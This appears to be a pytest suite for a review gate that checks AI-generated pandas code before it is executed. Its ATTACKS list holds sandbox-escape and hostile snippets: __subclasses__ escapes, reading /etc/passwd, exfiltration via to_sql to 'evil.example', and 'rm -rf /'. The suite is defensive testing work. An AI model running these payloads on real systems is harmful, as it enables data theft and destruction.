"""The governance gate. Generated code is untrusted, so these are the tests
that matter most: a regression here means arbitrary code reaches exec()."""

import pytest

from app.agents.impact_agent import CodeRejected, review

LEGITIMATE = [
    "result = df.groupby('region', as_index=False)['revenue'].sum()",
    "tmp = df[df['revenue'] > 100]\nresult = tmp.groupby('region', as_index=False)['revenue'].mean()",
    "result = df['revenue'].sum()",
    "d = pd.to_datetime(df['order_date'], errors='coerce')\n"
    "result = df.assign(month=d.dt.to_period('M').astype(str)).groupby('month', as_index=False)['revenue'].sum()",
    "result = q1_orders.merge(customers, on='customer_id', how='left')"
    ".groupby('country', as_index=False)['revenue'].sum()",
    "result = df.query('revenue > 500').sort_values('revenue')",
    "result = df.assign(band=df['revenue'].map(lambda v: 'hi' if v > 100 else 'lo'))",
    "result = df.pivot_table(index='region', values='revenue', aggfunc='sum').reset_index()",
    "result = df.nlargest(10, 'revenue')[['region', 'revenue']]",
]

ATTACKS = [
    ("import", "import os\nresult = os.listdir('.')"),
    ("from-import", "from subprocess import run\nresult = run(['ls'])"),
    ("dunder import", "result = __import__('os').listdir('.')"),
    ("subclass escape", "result = ().__class__.__bases__[0].__subclasses__()"),
    ("globals", "result = globals()"),
    ("locals", "result = locals()"),
    ("open", "result = open('/etc/passwd').read()"),
    ("eval", "result = eval('1+1')"),
    ("exec", "exec('x=1')\nresult = 1"),
    ("write csv", "result = df.to_csv('/tmp/leak.csv')"),
    ("write sql", "result = df.to_sql('t', 'postgresql://evil.example/db')"),
    ("read external", "result = pd.read_csv('/etc/passwd')"),
    ("getattr bypass", "result = getattr(df, 'to_csv')('/tmp/x')"),
    ("setattr", "result = setattr(df, 'x', 1)"),
    ("os.system", "result = pd.system('rm -rf /')"),
    ("dunder in lambda", "result = df['a'].map(lambda v: v.__class__)"),
    ("dunder in comprehension", "result = [x.__dict__ for x in df.columns]"),
]

MALFORMED = [
    ("no result", "answer = df.sum()"),
    ("syntax error", "result = df.groupby("),
    ("empty", ""),
    ("whitespace", "   \n  "),
]


@pytest.mark.parametrize("code", LEGITIMATE)
def test_allows_legitimate_analysis(code):
    assert review(code)["approved"] is True


@pytest.mark.parametrize("name,code", ATTACKS, ids=[n for n, _ in ATTACKS])
def test_blocks_attack(name, code):
    with pytest.raises(CodeRejected):
        review(code)


@pytest.mark.parametrize("name,code", MALFORMED, ids=[n for n, _ in MALFORMED])
def test_rejects_malformed(name, code):
    with pytest.raises(CodeRejected):
        review(code)


def test_requires_result_assignment():
    with pytest.raises(CodeRejected, match="result"):
        review("df.groupby('region').sum()")


def test_reports_complexity():
    simple = review("result = df['revenue'].sum()")
    complex_ = review(
        "result = (a.merge(b, on='k').merge(c, on='k')"
        ".groupby('x', as_index=False).agg({'y': 'sum'}).sort_values('y'))"
    )
    assert simple["estimated_cost"] == "low"
    assert complex_["table_operations"] > simple["table_operations"]
